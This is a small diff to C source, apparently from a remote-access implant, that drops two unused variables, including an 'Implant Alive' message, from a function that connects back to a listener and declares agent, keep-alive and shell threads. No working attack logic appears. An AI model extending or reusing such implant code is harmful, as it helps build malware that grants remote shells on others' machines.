@@ -76,8 +76,6 @@ int connect_to_listener(char* ip_addr, int port){
 
     int sockfd;
     int status;
-    char* buffer;
-    char* message = "Implant Alive\n";
     struct sockaddr_in addr;
     pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid, keep_alive_tid, shell_tid;
 
